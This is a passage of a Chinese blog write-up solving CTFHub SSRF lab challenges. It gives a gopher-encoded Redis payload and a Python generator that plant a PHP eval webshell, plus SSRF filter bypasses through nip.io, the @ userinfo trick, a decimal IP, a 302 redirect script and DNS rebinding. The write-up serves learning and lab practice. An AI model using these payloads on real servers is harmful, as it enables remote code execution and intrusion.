+<code-box id="code-yX8EH6"><button boxid="code-yX8EH6" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-yX8EH6 pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-yX8EH6" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>])) {
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: /?url=_"</span>);
+    <span class="hljs-keyword">exit</span>;
+}
+
+<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'url'</span>]);
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);
+<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
+<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
+<span class="hljs-meta">?&gt;</span>
+</code></pre></code-box>
+<p>​	这道题和上道题方法类似，都是利用gopher来构造特定协议内容，直接和应用通信，这道题用的是Redis的RESP协议</p>
+<p>​	关于RESP和其他详细分析，可以参考<a href="https://xz.aliyun.com/t/5665#toc-0" target="_blank" rel="noopener">这篇文章</a></p>
+<ul>
+<li>
+<p>利用Redis来写webshell</p>
+<p>redis命令</p>
+<code-box id="code-hdthAB"><button boxid="code-hdthAB" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-hdthAB pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-bash" highlighted="true" boxid="code-hdthAB" style="background: rgb(245, 245, 250);"><code class="language-bash highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;">flushall
+<span class="hljs-built_in">set</span> 1 <span class="hljs-string">'&lt;?php eval($_GET["cmd"]);?&gt;'</span>
+config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html
+config <span class="hljs-built_in">set</span> dbfilename shell.php
+save
+</code></pre></code-box>
+</li>
+<li>
+<p>利用脚本转换为gopher的payload（出自上面的文章）</p>
+<code-box id="code-Anessz"><button boxid="code-Anessz" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-Anessz pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-python" highlighted="true" boxid="code-Anessz" style="background: rgb(245, 245, 250);"><code class="language-python highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-keyword">import</span> urllib
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+
+protocol = <span class="hljs-string">"gopher://"</span>
+ip = <span class="hljs-string">"127.0.0.1"</span>
+port = <span class="hljs-string">"6379"</span>
+shell = <span class="hljs-string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
+filename = <span class="hljs-string">"shell.php"</span>
+path = <span class="hljs-string">"/var/www/html"</span>
+passwd = <span class="hljs-string">""</span>
+cmd = [<span class="hljs-string">"flushall"</span>,
+       <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"${IFS}"</span>)),
+       <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
+       <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
+       <span class="hljs-string">"save"</span>
+       ]
+<span class="hljs-keyword">if</span> passwd:
+    cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
+payload_prefix = protocol + ip + <span class="hljs-string">":"</span> + port + <span class="hljs-string">"/_"</span>
+CRLF = <span class="hljs-string">"\r\n"</span>
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
+    redis_arr = arr.split(<span class="hljs-string">" "</span>)
+    cmd_ = <span class="hljs-string">""</span>
+    cmd_ += <span class="hljs-string">"*"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
+    <span class="hljs-keyword">for</span> x_ <span class="hljs-keyword">in</span> redis_arr:
+        cmd_ += CRLF + <span class="hljs-string">"$"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x_.replace(<span class="hljs-string">"${IFS}"</span>, <span class="hljs-string">" "</span>)))) + CRLF + x_.replace(<span class="hljs-string">"${IFS}"</span>, <span class="hljs-string">" "</span>)
+    cmd_ += CRLF
+    <span class="hljs-keyword">return</span> cmd_
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    payload = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
+        payload += parse.quote(redis_format(x))  <span class="hljs-comment"># url编码</span>
+    payload = payload_prefix + parse.quote(payload)  <span class="hljs-comment"># 再次url编码</span>
+    <span class="hljs-built_in">print</span>(payload)
+</code></pre></code-box>
+<p>添加了一次url编码，来适配GET的两次解码</p>
+<p>得到payload：<code>gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%3C%253Fphp%2520eval%2528%2524_GET%255B%22cmd%22%255D%2529%253B%253F%3E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></p>
+<p>然后访问<code>/shell.php?cmd=php_code;</code>即可</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="tid-b86mf5" tid="tid-b86mf5">8.URL Bypass<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p><code> url must startwith "http://notfound.ctfhub.com"</code></p>
+</li>
+<li>
+<p>解题过程</p>
+<p>之前有过xss的bypass经验，知道两个方法：</p>
+<ul>
+<li>
+<p>利用<code>xip.io</code>（可以直接访问该域名，里面有详细说明）</p>
+<ul>
+<li>访问<code>www.xxx.com.1.1.1.1.xip.io</code>，会解析为1.1.1.1</li>
+<li>尝试发现，<code>xip.io</code>被ban了</li>
+</ul>
+</li>
+<li>
+<p>尝试<code>nip.io</code></p>
+<ul>
+<li>可以使用</li>
+<li>payload：<code>?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php</code></li>
+</ul>
+</li>
+<li>
+<p>使用HTTP基础认证</p>
+<ul>
+<li>payload：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="tid-S7PkWb" tid="tid-S7PkWb">9.数字IP Bypass<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>无</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=http://127.0.0.1</code>，提示ban掉了<code>127 172 @</code></p>
+<p><a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205301933-828486553.png"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205301933-828486553.png"></a></p>
+<p>只需要把<code>127.0.0.1</code>转换为数字IP，结果为<code>2130706433</code></p>
+<p>payload：<code>?url=http://2130706433/flag.php</code></p>
+</li>
+</ul>
+<h2 id="tid-ET45zm" tid="tid-ET45zm">10.302跳转 Bypass<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>无</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=http://127.0.0.1</code>，提示禁止访问局域网ip</p>
+<p><a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205308431-1267011645.png"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/1706496-20201211205308431-1267011645.png"></a></p>
+<p>只需要把跳转的脚本上传到vps上，然后访问vps上的脚本，跳转回去即可</p>
+<code-box id="code-NaSPrT"><button boxid="code-NaSPrT" type="button" class="clipboard code-copay-btn" data-clipboard-action="copy" data-clipboard-target="#code-NaSPrT pre" aria-label="复制代码"><i class="iconfont icon-fuzhi1"></i></button><div class="code-tools" style="background: rgb(245, 245, 250);"></div><pre class="highlighter-hljs language-php" highlighted="true" boxid="code-NaSPrT" style="background: rgb(245, 245, 250);"><code class="language-php highlighter-hljs hljs" style="background: none; border: 0px; border-radius: 0px; padding: 0px;"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])){
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: <span class="hljs-subst">{$_GET['url']}</span>"</span>);
+    <span class="hljs-keyword">exit</span>;
+}
+<span class="hljs-meta">?&gt;</span>
+</code></pre></code-box>
+<p><code>?url=http://IP:PORT/302.php?url=http://127.0.0.1/flag.php</code></p>
+</li>
+</ul>
+<h2 id="tid-ZiYXNk" tid="tid-ZiYXNk">11.DNS重绑定 Bypass<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
+<ul>
+<li>
+<p>题目描述</p>
+<p>无</p>
+</li>
+<li>
+<p>解题过程</p>
+<p>访问<code>?url=http://127.0.0.1</code>，提示禁止访问局域网ip</p>
+<p>题目是DNS重绑定，就去搜了一下相关资料 来源：<a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a></p>
+<blockquote>
+<p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p>
+<p><a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/14948315084608.png!small"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/14948315084608.png!small"></a></p>
+<p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。</p>
+<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
+<blockquote>
+<p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p>
+<p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p>
+<p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p>
+<p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>
+</blockquote>
+</blockquote>
+<p>推荐一个很详细的资料：<a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于DNS-rebinding的总结</a></p>
+<p>需要有域名和vps，然后根据总结里的方法，就可以完成</p>
+<p>（我暂时没有能用的域名，挖个坑，以后来填）</p>
+</li>
+</ul>
+
+<div> <nav id="articleDirectory" style="top: 251px; right: 5px; width: 260px; display: none;" class="articleDirectoryFixed"> <ul class="nav nav-pills"> <li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow active" href="https://www.cnblogs.com/R3col/p/14122684.html#ssrf" goto="tid-KniWTX" onclick="return false;">SSRF</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-r3ebjm" goto="tid-r3ebjm" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;1.内网访问</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-p5jaAH" goto="tid-p5jaAH" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;2.伪协议读取文件</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-3cB78n" goto="tid-3cB78n" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;3.端口扫描</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-kZCMBY" goto="tid-kZCMBY" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;4.POST请求</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-aRy7dn" goto="tid-aRy7dn" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;5.上传文件</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-nDncbf" goto="tid-nDncbf" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;6.FastCGI协议</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ZFsxpH" goto="tid-ZFsxpH" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;7.Redis</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-b86mf5" goto="tid-b86mf5" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;8.URL Bypass</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-S7PkWb" goto="tid-S7PkWb" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;9.数字IP Bypass</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ET45zm" goto="tid-ET45zm" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;10.302跳转 Bypass</a></li><li class="nav-item articleDirectory-overflow"><a class="nav-link articleDirectory-overflow" href="https://www.cnblogs.com/R3col/p/14122684.html#tid-ZiYXNk" goto="tid-ZiYXNk" onclick="return false;">&nbsp;&nbsp;&nbsp;&nbsp;11.DNS重绑定 Bypass</a></li> </ul> </nav> </div><span class="articleSuffix-flg"> <br><p class="essaySuffix-eof">__EOF__</p> <div id="articleSuffix"> <div class="articleSuffix-bg"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 147.78 155.96"> <path d="M10.5,99.81a1.9,1.9,0,0,0-.53-.09,1.66,1.66,0,0,0-1.64,1.65A1.64,1.64,0,0,0,10,103a1.57,1.57,0,0,0,.87-.25l26.76,26.82.45-1.08L11.52,101.91A1.65,1.65,0,0,0,10.5,99.81Zm-.13,2a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.58.58,0,0,1,.57-.57h0a.57.57,0,0,1,.56.58A.55.55,0,0,1,10.37,101.77Z" style="fill:#c5c9e0"></path><path d="M56.15,117.58H39.06l0-.09a1.65,1.65,0,0,0-1.36-1H37.5a1.65,1.65,0,1,0,1.56,2.19H55.7L92.92,156h41.44v-1.08h-41Zm-18.25.94a.56.56,0,0,1-.79,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h0a.58.58,0,0,1,.57.58A.54.54,0,0,1,37.9,118.52Z" style="fill:#c5c9e0"></path><path d="M23.52,50.32a1.65,1.65,0,0,0,1.55-1.11H55.28l48-48.13h31.06V0H102.85l-48,48.13H25.07a1.64,1.64,0,0,0-2.09-1,1.64,1.64,0,0,0,.54,3.2Zm0-2.21a.57.57,0,0,1,0,1.13.57.57,0,1,1,0-1.13Z" style="fill:#c5c9e0"></path><polygon points="102.86 0 102.86 0 102.86 0 102.86 0" style="fill:#c5c9e0"></polygon><path d="M107.72,12.14h26.64V11.07H107.27L57.4,61H3.09a1.66,1.66,0,0,0-1.45-.86H1.52A1.65,1.65,0,1,0,2.81,63a1.59,1.59,0,0,0,.45-.87H57.85ZM2.05,62.23a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h.09a.57.57,0,0,1,.32,1Z" style="fill:#c5c9e0"></path><path d="M134.36,43.22V42.14h-22.3l-9.62,9.63a1.64,1.64,0,0,0-2.19.77,1.61,1.61,0,0,0-.17.71,1.65,1.65,0,1,0,3.29,0,1.61,1.61,0,0,0-.16-.72l9.3-9.32Zm-32.64,10.6a.57.57,0,0,1,0-1.13.57.57,0,0,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M147,52.3l-9,9H111.48a1.64,1.64,0,0,0-1.61-1.33h-.14a1.65,1.65,0,1,0,1.6,2.41h27.19l9.26-9.29L147,52.3Zm-37.15,9.85a.56.56,0,0,1-.56-.57h0a.56.56,0,0,1,.56-.56h0a.57.57,0,1,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M66.79,75.35l11,11.06h56.53V85.33H78.27l-11-11.06H49.49L37.12,86.67a1.64,1.64,0,0,0-2.09,1,1.61,1.61,0,0,0-.09.54,1.65,1.65,0,0,0,3.29,0,1.68,1.68,0,0,0-.26-.89l12-12ZM36.58,88.79a.57.57,0,1,1,.57-.56A.57.57,0,0,1,36.58,88.79Z" style="fill:#c5c9e0"></path><path d="M110.61,95.55,92.8,113.4a1.62,1.62,0,1,0,.77.76l17.49-17.53h23.31V95.55ZM92.49,115.28a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.57-.57h0a.58.58,0,0,1,.56.58A.55.55,0,0,1,92.49,115.28Z" style="fill:#c5c9e0"></path><path d="M97.89,122.3H76.62L64.2,109.85a1.65,1.65,0,0,0-.77-2.2,1.77,1.77,0,0,0-.72-.17h-.14a1.65,1.65,0,0,0,.15,3.29,1.58,1.58,0,0,0,.71-.17l12.74,12.77H98.34l17.48-17.52h18.54v-1.08h-19ZM63.12,109.53a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,1.14,0A.54.54,0,0,1,63.12,109.53Z" style="fill:#c5c9e0"></path> </svg> </div> <div class="articleSuffix-left"> <a data-fancybox="gallery" href="./CTFHub-技能树-SSRF - R3col - 博客园_files/20210228003438.png"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/20210228003438.png"></a> </div> <div class="articleSuffix-right"> <item> <li> <b>本文作者：</b> <a href="https://www.cnblogs.com/R3col" target="_blank">r3col</a> </li> <li> <b>本文链接：</b> <a href="https://www.cnblogs.com/R3col/p/14122684.html" target="_blank">https://www.cnblogs.com/R3col/p/14122684.html</a> </li> <li> <b>关于博主：</b> 评论和私信会在第一时间回复。或者<a href="https://msg.cnblogs.com/msg/send/R3col" target="_blank">直接私信</a>我。 </li> <li> <b>版权声明：</b> 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" alt="BY-NC-SA" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！ </li> <li> <b>声援博主：</b> 如果您觉得文章对您有帮助，可以点击文章右下角<strong><span style="color: #ff0000; font-size: 12pt;">【<a id="post-up" onclick="votePost(14122684,&#39;Digg&#39;)" href="javascript:void(0);">推荐</a>】</span></strong>一下。 </li> </item> </div> <div style="clear:both"></div> </div> </span></div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo">
+
+
+<div id="BlogPostCategory">
+    分类: 
+            <a href="https://www.cnblogs.com/R3col/category/1664486.html" target="_blank"><span class="iconfont icon-marketing_fill"></span>CTF</a>
+</div>
+<div id="EntryTag">
+    标签: 
+            <a href="https://www.cnblogs.com/R3col/tag/SSRF/"><span class="iconfont icon-label_fill"></span>SSRF</a>
+,             <a href="https://www.cnblogs.com/R3col/tag/CTFHub/"><span class="iconfont icon-label_fill"></span>CTFHub</a>
+</div>
+    <div id="blog_post_info">
+<div id="green_channel">
+        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(14122684,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a><button class="custom-btn btn-11" onclick="DiggIt(14122684,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">推荐该文<div class="dot"></div></button>
+        <a id="green_channel_follow" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;);" href="javascript:void(0);">关注我</a><button class="custom-btn btn-12" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;);"><span>关注博主</span><span>关注博主</span></button>
+    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a><button class="custom-btn btn-7" onclick="AddToWz(cb_entryId);return false;"><span>收藏本文</span></button>
+    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/icon_weibo_24.png" alt=""></a><button class="custom-btn btn-15" onclick="ShareToTsina()">分享微博</button>
+    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/wechat.png" alt=""></a><button class="custom-btn btn-13" onclick="shareOnWechat()">分享微信</button>
+</div>
+<div id="author_profile">
+    <div id="author_profile_info" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/R3col/" target="_blank"><img src="./CTFHub-技能树-SSRF - R3col - 博客园_files/20210228003438.png" class="author_avatar" alt=""></a>
+        <div id="author_profile_detail" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/R3col/">R3col</a>
+            <br>
+            <a href="https://home.cnblogs.com/u/R3col/followers/">粉丝 - <span class="follower-count">18</span></a>
+            <a href="https://home.cnblogs.com/u/R3col/followees/">关注 - <span class="following-count">11</span></a><br>
+        </div>
+    </div>
+    <div class="clear"></div>
+    <div id="author_profile_honor"></div>
+    <div id="author_profile_follow" class="follow-tip">
+                <a href="javascript:void(0);" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;);return false;">+加关注</a>
+    </div>
+</div>
+<div id="div_digg">
+    <div class="diggit" onclick="votePost(14122684,&#39;Digg&#39;)"><i class="iconfont icon-zan1"></i>
+        <span class="diggnum" id="digg_count">1</span>
+    </div>
+    <div class="buryit" onclick="votePost(14122684,&#39;Bury&#39;)"><i class="iconfont icon-buzan"></i>
+        <span class="burynum" id="bury_count">0</span>
+    </div>
+    <div class="clear"></div>
+    <div class="diggword" id="digg_tips">
+    </div>
+</div>
+
+<script type="text/javascript">
+    currentDiggType = 0;
+</script></div>
+    <div class="clear"></div>
+    <div id="post_next_prev">
+
+    <a href="https://www.cnblogs.com/R3col/p/13390419.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/R3col/p/13390419.html" data-featured-image="" title="发布于 2020-07-28 12:21">web php wrong nginx config</a>
+    <br>
+    <a href="https://www.cnblogs.com/R3col/p/14122692.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/R3col/p/14122692.html" data-featured-image="" title="发布于 2020-12-11 20:57">SSRF_FastCGI</a>
+
+</div>
+</div>
+            </div>
+            <div class="postDesc" style="display: block;">posted @ 
+<span id="post-date" data-last-update-days="924.1144489589607" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2020-12-11 20:59" aria-expanded="false">2020-12-11 20:54</span>&nbsp;
+<a href="https://www.cnblogs.com/R3col/">R3col</a>&nbsp;
+阅读(<span id="post_view_count">1205</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=14122684" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(14122684);return false;">收藏</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: &#39;&#39;, targetType: &#39;blogPost&#39;, targetId: &#39;14122684&#39;, targetLink: &#39;https://www.cnblogs.com/R3col/p/14122684.html&#39;, title: &#39;CTFHub-技能树-SSRF&#39; })">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+
+<script>
+    var cb_entryId = 14122684, cb_entryCreatedDate = '2020-12-11 20:54', cb_postType = 1, cb_postTitle = 'CTFHub-技能树-SSRF';
+    var allowComments = true, cb_blogId = 584258, cb_blogApp = 'R3col', cb_blogUserGuid = '2f8aa281-e0eb-480b-4907-08d6e658f5b8';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
+    updatePostStats(
+            [cb_entryId],
+            function(id, count) { $("#post_view_count").text(count) },
+            function(id, count) { $("#post_comment_count").text(count) });
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="https://www.cnblogs.com/R3col/p/14122684.html#" onclick="return RefreshPage();">刷新页面</a><a href="https://www.cnblogs.com/R3col/p/14122684.html#top">返回顶部</a></div>
+    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
+    登录后才能查看或发表评论，立即 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return account.login(&#39;!comments&#39;);">登录</a> 或者
+    <a href="https://www.cnblogs.com/">逛逛</a> 博客园首页
+</div>
+</div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="under-post-card">
+            <div id="div-gpt-ad-1592365906576-0" style="width: 300px; height: 250px;"></div>
+    </div>
+    <div id="under_post_card1"><div class="under-post-card">
+<b>编辑推荐：</b>
+<br>
+
+· <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank"> 如何在 long-running task 中调用 async 方法 </a>
+    <br>
+· <a href="https://www.cnblogs.com/coco1s/p/17495560.html" target="_blank">单标签下的日间/黑夜模式切换按钮效果</a>
+    <br>
+· <a href="https://www.cnblogs.com/tcjiaan/p/17487725.html" target="_blank">「.NET深呼吸」用代码写 WPF 控件模板</a>
+    <br>
+· <a href="https://www.cnblogs.com/jevonsflash/p/17489161.html" target="_blank">[MAUI]弧形进度条与弧形滑块的交互实现</a>
+    <br>
+· <a href="https://www.cnblogs.com/huangxincheng/p/17483537.html" target="_blank"> 记一次 .NET 某药材管理系统 卡死分析 </a>
+    <br>
+</div></div>
+    <div id="under_post_card2"><div class="itnews under-post-card">
+    <b>阅读排行：</b>
+    <br>
+ ·          <a href="https://www.cnblogs.com/cmt/p/17497412.html" target="_blank">【网站公告】园子被处罚，请大家不要发布/转载任何网络小说</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/chingho/p/17486465.html" target="_blank">适合Windows桌面、Material Design设计风格、WPF美观控件库【强烈推荐】</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank">如何在long-running task中调用async方法</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/tangyanzhi1111/p/17489381.html" target="_blank">C#/.Net的多播委托到底是啥？彻底剖析下</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/hejiale010426/p/17498629.html" target="_blank">如何取消Blazor Server烦人的重新连接？</a>
+        <br>
+</div></div>
+    <div id="HistoryToday" class="under-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+                setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+                LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
